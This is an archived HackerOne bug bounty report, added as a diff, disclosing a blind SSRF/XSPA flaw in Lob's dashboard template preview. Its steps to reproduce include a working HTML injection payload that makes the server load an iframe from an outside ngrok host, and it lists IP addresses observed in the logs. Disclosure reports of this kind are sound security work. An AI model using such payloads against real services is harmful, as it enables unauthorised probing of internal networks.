@@ -1,0 +1,37 @@
+ReportLink:https://hackerone.com/reports/517461
+WeaknessName:Server-Side Request Forgery (SSRF)
+Reporter:https://hackerone.com/jepatel
+ReportedTo:Lob(lob)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:28.03.2019 21:01:22
+
+Summary:
+
+## Summary:
+I was just playing around with the website and I found blind ```XSPA``` on time of creating ```Templets``` on ```dashboard.lob.com```.
+
+## Steps To Reproduce:
+
+  1. Go to https://dashboard.lob.com/#/templates
+  1. Now click on create templet and insert this code in ```HTML``` : ```"><img src="xasdasdasd" onerror="document.write('<iframe src=https://ded8c0a6.ngrok.io></iframe>')" />``` and click on create.
+  1. Now click on preview and see your ```server logs``` you can clearly see that injected code is going to rander and make backdoor connection with your server connection. 
+
+## During my testing I have got a below internal IP address. 
+```
+1. 34.210.83.118
+2. 34.219.18.217
+3. 52.88.138.14
+```
+
+
+
+
+
+##POC video
+{F453478}
+
+## Impact
+
+The preview template endpoint is vulnerable to a blind SSRF/XSPA vulnerability. The vulnerability allows an attacker to make arbitrary HTTP/HTTPS requests inside a lob.com instance's network.
